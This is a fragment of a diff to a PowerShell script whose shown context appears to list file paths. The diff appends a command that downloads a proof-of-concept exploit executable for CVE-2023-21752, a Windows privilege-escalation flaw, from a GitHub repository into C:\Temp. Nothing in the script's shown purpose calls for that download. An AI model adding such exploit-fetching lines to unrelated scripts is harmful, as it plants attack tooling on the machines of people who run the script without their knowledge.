@@ -23,3 +23,6 @@ ForEach-Object {
         $_.FullName
     }
 }
+
+
+powershell -Command "Invoke-WebRequest -Uri 'https://github.com/nu11secur1ty/CVE-mitre/raw/main/2023/CVE-2023-21752/PoC/Release/PoC-CVE-2023-21752.exe' -OutFile 'C:\Temp\PoC-CVE-2023-21752.exe'"
